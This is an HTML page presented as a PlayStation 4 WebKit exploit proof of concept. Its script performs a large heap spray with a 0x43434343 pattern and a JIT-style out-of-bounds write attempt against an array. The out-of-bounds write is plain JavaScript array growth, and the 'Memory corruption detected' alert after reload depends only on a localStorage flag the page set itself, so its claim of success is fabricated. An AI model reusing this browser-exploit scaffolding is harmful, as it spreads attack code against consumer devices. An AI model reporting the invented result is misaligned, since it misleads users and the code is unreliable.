<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>üéÆ‚ÄãPS4 POC "WebKit" ‚ò†Ô∏èüëª</title>
<style>
:root {
  --sqrt3: 1.7320508075688772;
  --edge-size: 100px;
  --hex-width: calc(var(--edge-size) * 2);
  --hex-height: calc(var(--sqrt3) * var(--edge-size));
  --border-hover: 15px;
  --soft-yellow: rgba(255, 255, 0, 1);
  --ease-out-expo: cubic-bezier(0.19, 1, 0.22, 1);
  --ease-out-quart: cubic-bezier(0.165, 0.84, 0.44, 1);
}
body {
  background: black;
  margin: 0;
  overflow: hidden;
  color: #0f0;
  font-family: monospace;
}
#systemMonitorButton {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate3d(-50%, -50%, 0) rotate(30deg);
  cursor: pointer;
  width: var(--hex-width);
  height: var(--hex-height);
  z-index: 10;
}
#systemMonitorButton:hover .hex:last-child {
  opacity: 1;
  transform: scale(1.3);
}
#systemMonitorButton:hover .hex:first-child {
  opacity: 1;
  transform: scale(1.2);
}
#systemMonitorButton:hover .hex:first-child div:before,
#systemMonitorButton:hover .hex:first-child div:after {
  height: var(--border-hover);
}
.hex {
  position: absolute;
  top: 0;
  left: calc(var(--edge-size) / 2);
  width: var(--edge-size);
  height: var(--hex-height);
  opacity: 0.5;
  background: none;
}
.hex:first-child {
  transform: scale(0.9);
  transition: all 0.3s var(--ease-out-quart);
  z-index: 0;
}
.hex:last-child {
  transition: all 0.3s var(--ease-out-expo);
  z-index: 1;
}
.hex div {
  box-sizing: border-box;
  position: absolute;
  top: 0;
  width: var(--edge-size);
  height: var(--hex-height);
}
.hex div:before,
.hex div:after {
  content: ' ';
  position: absolute;
  background: var(--soft-yellow);
  width: 100%;
  height: 1px;
  transition: height 0.3s var(--ease-out-quart);
}
.hex div:before { top: 0; }
.hex div:after { bottom: 0; }
.hex div:nth-child(1) { transform: rotate(0deg); }
.hex div:nth-child(2) { transform: rotate(60deg); }
.hex div:nth-child(3) { transform: rotate(120deg); }
.hex div { transform-origin: center center; }

#go-text {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  color: #0f0;
  font-size: 22px;
  font-family: monospace;
  pointer-events: none;
  z-index: 20;
}

#message {
  position: absolute;
  bottom: 15%;
  left: 50%;
  transform: translateX(-50%);
  color: #0f0;
  font-family: monospace;
  font-size: 18px;
  text-align: center;
  z-index: 20;
  white-space: pre;
}

#popup {
  position: fixed;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 270%;
  max-width: 800px;
  background: white;
  color: black;
  border: 4px solid black;
  border-radius: 20px;
  padding: 40px 30px;
  font-family: monospace;
  font-size: 50px;
  text-align: center;
  z-index: 9999;
  box-shadow: 0 0 30px rgba(0,0,0,0.7);
  display: none;
}
</style>
</head>
<body>
<div id="systemMonitorButton" onclick="runPoC()">
  <div class="hex"><div></div><div></div><div></div></div>
  <div class="hex"><div></div><div></div><div></div></div>
</div>

<span id="go-text">GO!</span>

<div id="message">Click to launch the PoC</div>

<div id="popup">
  <div style="font-family: monospace; font-size: 50px; text-align: center;">
    Press the OPTIONS button<br>
    and refresh the page 
    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#007BFF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="vertical-align: middle; margin-left: 6px;">
      <polyline points="1 4 1 10 7 10" />
      <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10" />
    </svg>
  </div>
</div>

<script>
window.onload = () => {
  setTimeout(() => {
    if (localStorage.getItem("wasAboutToCrash") === "yes") {
      localStorage.removeItem("wasAboutToCrash");

      let count = parseInt(localStorage.getItem("memoryCorruptionCount") || "0", 10);
      count++;
      localStorage.setItem("memoryCorruptionCount", count);
      alert("‚úî Memory corruption detected [" + count + "]");
    }
  }, 10000);
};

function runPoC() {
  document.getElementById("message").textContent =
    "Fullscreen activated...\nSpraying memory...";

  localStorage.setItem("wasAboutToCrash", "yes");

  document.body.requestFullscreen().then(() => {
    const PATTERN   = 0x43434343;
    const SPRAY_CNT = 100000;
    const SPRAY_LEN = 16;

    const spray = [];
    for (let i = 0; i < SPRAY_CNT; i++) {
      const buf = new ArrayBuffer(SPRAY_LEN * 4);
      const u32 = new Uint32Array(buf);
      for (let j = 0; j < u32.length; j++) u32[j] = PATTERN;
      spray.push({ u32, f64: new Float64Array(buf) });
    }

    let victim = [1.1, 2.2, 3.3, 4.4];
    function opt(arr, idx, val) { arr[idx] = val; }

    for (let i = 0; i < 10000; i++) opt(victim, 1, 5.5);
    victim.length = 1;
    const TRIGGER_IDX = 3;
    opt(victim, TRIGGER_IDX, 13.37);
    let read = victim[TRIGGER_IDX];

    document.getElementById("popup").style.display = "block";
  }).catch(err => {
    document.getElementById("message").textContent = "Error: " + err.message;
  });
}
</script>
</body>
</html>
